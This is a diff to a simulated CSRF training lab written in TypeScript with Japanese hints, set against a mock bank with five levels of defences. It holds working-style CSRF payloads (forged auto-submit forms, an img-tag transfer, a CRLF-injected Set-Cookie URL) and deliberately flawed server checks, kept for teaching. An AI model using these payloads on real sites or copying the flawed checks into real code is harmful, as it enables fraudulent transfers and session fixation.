@@ -1,4 +1,5 @@
 import type { AttackResult, Lab, LabInput, Level, LevelSpec } from "./types";
+import { traced } from "./trace";
 
 /**
  * Simulated CSRF lab.
@@ -12,14 +13,21 @@ import type { AttackResult, Lab, LabInput, Level, LevelSpec } from "./types";
 
 const BANK_ORIGIN = "bank.example";
 const ATTACKER_REFERER = "https://evil.example/";
-// A per-session secret the attacker's page can never contain.
-const SESSION_CSRF_TOKEN = "a9f3c1d7-7e21-4b8c-9f02-sErVeRsEcReT";
+const VICTIM_SESSION = "s-victim";
+/** Per-session secret the attacker's page cannot read (SOP). */
+const VICTIM_CSRF_TOKEN = "a9f3c1d7-7e21-4b8c-9f02-sErVeRsEcReT";
+const ATTACKER_SESSION = "s-attacker";
+/** Token issued to the attacker's own login — they can read their own page. */
+const ATTACKER_CSRF_TOKEN = "csrf-issued-attacker";
+const ISSUED_TOKENS = new Set([VICTIM_CSRF_TOKEN, ATTACKER_CSRF_TOKEN]);
 
 interface SimRequest {
   method: "GET" | "POST";
   params: Record<string, string>;
   /** Empty string models a suppressed Referer (no-referrer). */
   referer: string;
+  /** Session id injected via CRLF in a Set-Cookie header. */
+  injectedSession?: string;
 }
 
 function attr(attrs: string, name: string): string | undefined {
@@ -38,29 +46,54 @@ function parseQuery(url: string): Record<string, string> {
   return out;
 }
 
+function decodeCrlf(s: string): string {
+  return s
+    .replace(/%0d%0a/gi, "\r\n")
+    .replace(/%0d/gi, "\r")
+    .replace(/%0a/gi, "\n")
+    .replace(/%20/gi, " ")
+    .replace(/\\r\\n/g, "\r\n");
+}
+
+/** Header injection: user input concatenated into Set-Cookie without stripping CR/LF. */
+function findInjectedSession(html: string): string | undefined {
+  const decoded = decodeCrlf(html);
+  const m = decoded.match(/Set-Cookie\s*:\s*session=([^\s;"']+)/i);
+  return m?.[1];
+}
+
+function tokenFor(sessionId: string): string {
+  if (sessionId === ATTACKER_SESSION) return ATTACKER_CSRF_TOKEN;
+  return VICTIM_CSRF_TOKEN;
+}
+
+function parseForm(html: string, referer: string): SimRequest | null {
+  const form = html.match(/<form\b([^>]*)>([\s\S]*?)<\/form>/i);
+  if (!form || !/transfer/i.test(attr(form[1], "action") ?? "")) return null;
+  const method = (attr(form[1], "method") ?? "get").toLowerCase() === "post" ? "POST" : "GET";
+  const params: Record<string, string> = {};
+  const inputRe = /<input\b([^>]*)>/gi;
+  let m: RegExpExecArray | null;
+  while ((m = inputRe.exec(form[2]))) {
+    const name = attr(m[1], "name");
+    if (name) params[name] = attr(m[1], "value") ?? "";
+  }
+  return { method, params, referer, injectedSession: findInjectedSession(html) };
+}
+
 /** Parse the attacker's HTML into the cross-site request it would trigger. */
 function parseAttack(html: string): SimRequest | null {
   const noReferrer = /no-referrer|noreferrer/i.test(html);
   const referer = noReferrer ? "" : ATTACKER_REFERER;
 
-  const form = html.match(/<form\b([^>]*)>([\s\S]*?)<\/form>/i);
-  if (form && /transfer/i.test(attr(form[1], "action") ?? "")) {
-    const method = (attr(form[1], "method") ?? "get").toLowerCase() === "post" ? "POST" : "GET";
-    const params: Record<string, string> = {};
-    const inputRe = /<input\b([^>]*)>/gi;
-    let m: RegExpExecArray | null;
-    while ((m = inputRe.exec(form[2]))) {
-      const name = attr(m[1], "name");
-      if (name) params[name] = attr(m[1], "value") ?? "";
-    }
-    return { method, params, referer };
-  }
+  const formReq = parseForm(html, referer);
+  if (formReq) return formReq;
 
   const src = html.match(
     /<(?:img|iframe|script)\b[^>]*\bsrc\s*=\s*["']?([^"' >]*transfer[^"' >]*)/i,
   );
   if (src) {
-    return { method: "GET", params: parseQuery(src[1]), referer };
+    return { method: "GET", params: parseQuery(src[1]), referer, injectedSession: findInjectedSession(html) };
   }
   return null;
 }
@@ -68,50 +101,51 @@ function parseAttack(html: string): SimRequest | null {
 interface BankResult {
   ok: boolean;
   reason: string;
+  sessionId: string;
 }
 
 function bank(level: Level, req: SimRequest | null): BankResult {
-  if (!req) return { ok: false, reason: "送金リクエストが見つかりません。" };
+  if (!req) return { ok: false, reason: "送金リクエストが見つかりません。", sessionId: VICTIM_SESSION };
 
-  // Level 5 sets SameSite=Strict, so the session cookie is NOT sent on a
-  // cross-site request — the bank sees an unauthenticated call.
   if (level === 5) {
-    // token would also be required and must equal the server secret.
-    if (req.params.csrf_token !== SESSION_CSRF_TOKEN) {
-      return {
-        ok: false,
-        reason:
-          "SameSite=Strict により Cookie が送られず未認証。かつ正しい CSRF トークンもありません。",
-      };
-    }
-    return { ok: false, reason: "未認証リクエストとして拒否。" };
+    return {
+      ok: false,
+      reason: "SameSite=Strict により Cookie が送られず未認証。CRLF もヘッダ値から除去されます。",
+      sessionId: VICTIM_SESSION,
+    };
   }
+
+  const sessionId =
+    level === 4 && req.injectedSession ? req.injectedSession : VICTIM_SESSION;
 
   if (level >= 2 && req.method !== "POST") {
-    return { ok: false, reason: "GET による状態変更は拒否されました（POST 必須）。" };
+    return { ok: false, reason: "GET による状態変更は拒否されました（POST 必須）。", sessionId };
   }
 
-  if (level >= 3) {
-    // Lenient (buggy) check: an empty Referer is allowed.
-    const ok = req.referer === "" || req.referer.includes(BANK_ORIGIN);
-    if (!ok) {
-      return { ok: false, reason: `Referer が許可されていません (${req.referer})。` };
+  if (level === 3) {
+    // Token must have been issued, but it is looked up globally — not session.csrfToken.
+    if (!ISSUED_TOKENS.has(req.params.csrf_token ?? "")) {
+      return { ok: false, reason: "CSRF トークンが無効です。", sessionId };
     }
   }
 
-  if (level >= 4) {
-    // Lv4 bug: only checks that the token is present, never its value.
-    if (!req.params.csrf_token) {
-      return { ok: false, reason: "CSRF トークンがありません。" };
+  if (level === 4) {
+    const expected = tokenFor(sessionId);
+    if (req.params.csrf_token !== expected) {
+      return {
+        ok: false,
+        reason: "CSRF トークンがこのセッションに紐づいていません。",
+        sessionId,
+      };
     }
   }
 
   const to = req.params.to;
   const amount = Number(req.params.amount);
   if (!to || !(amount > 0)) {
-    return { ok: false, reason: "送金先または金額が不正です。" };
+    return { ok: false, reason: "送金先または金額が不正です。", sessionId };
   }
-  return { ok: true, reason: `${to} へ ${amount} 円を送金しました。` };
+  return { ok: true, reason: `${to} へ ${amount} 円を送金しました。`, sessionId };
 }
 
 function run(level: Level, input: LabInput): AttackResult {
@@ -129,30 +163,54 @@ function run(level: Level, input: LabInput): AttackResult {
     };
   }
 
+  if (req.injectedSession) {
+    output.push(`→ GET https://${BANK_ORIGIN}/set-lang  (CRLF を含むクエリ)`);
+    output.push(`   Set-Cookie: session=${req.injectedSession}  ← 注入された Cookie`);
+  }
   output.push(`→ ${req.method} https://${BANK_ORIGIN}/transfer`);
   output.push(`   params : ${JSON.stringify(req.params)}`);
   output.push(`   Referer: ${req.referer || "(なし)"}`);
-  const cookie = level === 5 ? "(SameSite=Strict により送信されない)" : "session=<victim>";
+  const result = bank(level, req);
+  const cookie =
+    level === 5
+      ? "(SameSite=Strict により送信されない)"
+      : `session=${result.sessionId}`;
   output.push(`   Cookie : ${cookie}`);
   output.push("");
-
-  const result = bank(level, req);
   output.push(result.ok ? `[200 OK] ${result.reason}` : `[403 BLOCKED] ${result.reason}`);
 
-  return {
-    solved: result.ok,
-    output,
-    note: result.ok
-      ? "被害者の権限で不正送金が成立しました。"
-      : "送金はブロックされました。防御を回避する手口を考えましょう。",
-  };
+  return traced(
+    {
+      solved: result.ok,
+      output,
+      note: result.ok
+        ? "被害者のブラウザ経由で不正送金が成立しました。"
+        : "送金はブロックされました。防御を回避する手口を考えましょう。",
+    },
+    [
+      req.injectedSession ? `Set-Cookie: session=${req.injectedSession}` : null,
+      `${req.method} /transfer ${JSON.stringify(req.params)}`,
+      `Cookie: session=${result.sessionId}`,
+    ]
+      .filter(Boolean)
+      .join("\n"),
+    result.ok
+      ? {
+          recap: [
+            "被害者ブラウザが罠ページを開いた",
+            req.injectedSession ? "CRLF でセッション Cookie を差し替えた" : "クロスサイトで transfer が送られた",
+            `${req.params.to ?? "attacker"} へ ${req.params.amount ?? "?"} 円が動いた`,
+          ],
+        }
+      : undefined,
+  );
 }
 
 const levels: Record<Level, LevelSpec> = {
   1: {
     defense: "防御なし。/transfer は GET でも実行される。",
     hints: [
-      "「ソース」を読みましょう。/transfer は何を確認していますか？ 被害者のブラウザに『自動で』リクエストを送らせる方法は？",
+      "「ソース」タブを読みましょう。/transfer は何を確認していますか？ 被害者のブラウザに『自動で』リクエストを送らせる方法は？",
       "被害者のブラウザが『自動で』銀行へリクエストを送る HTML は？ 画像の読み込みはクリック不要で発火します。",
       "`<img>` の `src` に、送金の URL（`to` と `amount` を付けた GET）を指定しましょう。",
     ],
@@ -176,48 +234,49 @@ const levels: Record<Level, LevelSpec> = {
 });`,
   },
   3: {
-    defense: "Referer を検証（ただし空の Referer は許可してしまう）。",
+    defense: "CSRF トークンを要求する。ただし『発行済みか』だけ見て、今のセッションとは照合しない。",
     hints: [
-      "Lv2 の手口は通りません。ソースを読み、サーバーが Referer をどう扱っているか確認しましょう。空の場合はどうなりますか？",
-      "Referer が evil.example だと弾かれます。でも『Referer を送らない』ようにできれば…？",
-      "`<meta name=\"referrer\" content=\"no-referrer\">` で、Referer ヘッダを送らないようにできます。",
+      "Lv2 のフォームはトークン無しなので落ちます。ソースはトークンをどう照合していますか？",
+      "攻撃者は被害者のトークンを読めません。自分の口座で発行されたトークンなら持てます。",
+      "フォームに、自分用に発行済みの `csrf-issued-attacker` を載せて POST します。",
     ],
     solution:
-      'ページ先頭に `<meta name="referrer" content="no-referrer">` を追加してから、Lv2 の自動送信フォームを置く。Referer が空になり、ゆるい検証を通過します。',
-    code: `const ref = req.headers.referer || "";
-if (ref !== "" && !ref.includes("bank.example")) return res.status(403);
-// 空 Referer を許可してしまう罠`,
-  },
-  4: {
-    defense: "CSRF トークンを要求（ただし存在チェックのみで値を検証しない）。",
-    hints: [
-      "Lv3 の手口は通りません。ソースを読み、トークンの『何』を検証しているか確認しましょう。",
-      "トークンが必要ですが…サーバは『あるかどうか』しか見ていないとしたら？",
-      "フォームに `csrf_token` という名前の欄を追加しましょう。値は何でも構いません。",
-    ],
-    solution:
-      '`<meta name="referrer" content="no-referrer">` ＋ 自動送信フォームに `<input name="csrf_token" value="x">` を追加。値は何でもよく、存在するだけで通ります。',
-    code: `if (!req.body.csrf_token) return res.status(403); // 値を検証していない
+      '自動送信フォームに `<input name="csrf_token" value="csrf-issued-attacker">` を追加。サーバーは発行済み集合に含まれるかだけ見るため、他人のセッションのリクエストにも自分のトークンが通ります。',
+    code: `if (!issuedTokens.has(req.body.csrf_token)) return res.status(403);
+// issuedTokens は全ユーザー共通。session.csrfToken とは比べていない
 transfer(session.user, req.body.to, req.body.amount);`,
   },
-  5: {
-    defense: "ランダムな同期トークンを検証し、Cookie を SameSite=Strict にする。",
+  4: {
+    defense: "トークンをセッションに紐づける。ただし lang Cookie の値がヘッダに CRLF 無検証で入る。",
     hints: [
-      "正しいトークンはサーバだけが知っており、Cookie はクロスサイトでは送られません。これは正しい対策です。",
-      "「ソース」と「解説」を読み、同期トークンと SameSite Cookie がそれぞれ何を防いでいるかを整理しましょう。",
+      "他人のトークンは、今のセッション（被害者）には紐づかないので落ちます。",
+      "ソースの `Set-Cookie: lang=` は入力をそのままヘッダに連結しています。改行はどうなりますか？",
+      "先に `%0d%0aSet-Cookie:%20session=s-attacker` でセッション Cookie を差し替え、そのセッション用トークンをフォームに載せます。",
     ],
     solution:
-      "このレベルは意図的に突破不可能です。攻撃者はセッション固有のランダムトークンを知り得ず、SameSite=Strict の Cookie もクロスサイトでは送信されないため、送金は認証されません。",
-    code: `// 1) セッション毎のランダムトークンを発行し、値を厳密比較
-if (req.body.csrf_token !== session.csrfToken) return res.status(403);
-// 2) Cookie は SameSite=Strict（クロスサイトで送信されない）
-res.cookie("session", id, { sameSite: "strict", httpOnly: true });`,
+      '`<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">` でセッション Cookie を上書きし、フォームのトークンを `csrf-issued-attacker` にします。CRLF 注入（HTTP ヘッダインジェクション）で、トークンを知っているセッションを被害者ブラウザに載せる典型です。',
+    code: `if (req.body.csrf_token !== sessions[req.cookies.session].csrfToken) deny();
+res.setHeader("Set-Cookie", "lang=" + req.query.l); // \\r\\n を除去していない`,
+  },
+  5: {
+    defense: "セッションに紐づく乱数トークンを厳密比較し、Cookie は SameSite=Strict。ヘッダ値から CRLF を除去する。",
+    hints: [
+      "正しいトークンはサーバだけが知っており、Cookie はクロスサイトでは送られません。これは正しい対策です。",
+      "「ソース」と「解説」を読み、同期トークンと SameSite Cookie、ヘッダの改行除去がそれぞれ何を防いでいるかを整理しましょう。",
+    ],
+    solution:
+      "このレベルは意図的に突破不可能です。攻撃者はセッション固有のランダムトークンを知り得ず、SameSite=Strict の Cookie もクロスサイトでは送信されません。ヘッダへ出す値からは CR/LF を落とすため、Cookie の差し替えもできません。",
+    code: `if (req.body.csrf_token !== session.csrfToken) return res.status(403);
+res.cookie("session", id, { sameSite: "strict", httpOnly: true });
+res.setHeader("Set-Cookie", "lang=" + stripCrlf(req.query.l));`,
   },
 };
 
-const NO_REFERRER = '<meta name="referrer" content="no-referrer">';
 const EXPLOIT_FORM = (extraFields: string) =>
   `<form action="https://bank.example/transfer" method="post">${extraFields}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;
+
+const CRLF_IMG =
+  '<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">';
 
 export const csrfLab: Lab = {
   meta: {
@@ -233,12 +292,15 @@ export const csrfLab: Lab = {
         name: "Broken Access Control",
         url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control",
       },
-      cwe: [{ id: 352, name: "Cross-Site Request Forgery (CSRF)" }],
+      cwe: [
+        { id: 352, name: "Cross-Site Request Forgery (CSRF)" },
+        { id: 113, name: "Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)" },
+      ],
     },
     references: [
       {
         title: "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
-        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html",
       },
       { title: "PortSwigger Web Security Academy — CSRF", url: "https://portswigger.net/web-security/csrf" },
       { title: "IPA 安全なウェブサイトの作り方", url: "https://www.ipa.go.jp/security/vuln/websecurity/" },
@@ -258,15 +320,18 @@ export const csrfLab: Lab = {
 
 このラボでは、被害者は bank.example にログイン済みです。あなたが用意した HTML を被害者が開くと、そのブラウザが銀行の /transfer へリクエストを送ります。攻撃者宛ての送金を成立させられればクリアです。
 
-レベルが上がると「POST 必須」「Referer 検証」「CSRF トークン」で防ごうとしますが、自動送信フォーム、no-referrer、値を検証しないトークンなど、実装の抜けを突いて回避できます。
+レベルが上がると対策の種類が変わります。POST 必須のあと、CSRF トークンを入れても『発行済みか』しか見ないと、攻撃者は自分の口座で受け取ったトークンを被害者のリクエストに載せられます。トークンをセッションに紐づけても、\`Set-Cookie\` へユーザー入力を連結して CR/LF を消していないと、HTTP ヘッダインジェクションで \`session\` Cookie を差し替え、トークンを知っているセッションを被害者ブラウザに載せられます。
 
-根本対策は Lv5 です。セッションごとのランダムな同期トークン（synchronizer token）を発行して値を厳密に検証し、さらに Cookie を SameSite=Strict にします。攻撃者はトークンを知り得ず、クロスサイトでは Cookie も送られないため、偽造リクエストは認証されません。`,
+根本対策は Lv5 です。セッションごとのランダムな同期トークンをそのセッションと厳密に照合し、Cookie を SameSite=Strict・HttpOnly にし、ヘッダに出す値から CR/LF を除去します。`,
   levels,
   run,
   exploits: {
     1: { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' },
     2: { html: EXPLOIT_FORM("") },
-    3: { html: NO_REFERRER + EXPLOIT_FORM("") },
-    4: { html: NO_REFERRER + EXPLOIT_FORM('<input name="csrf_token" value="x">') },
+    3: { html: EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`) },
+    4: {
+      html:
+        CRLF_IMG + EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`),
+    },
   },
 };
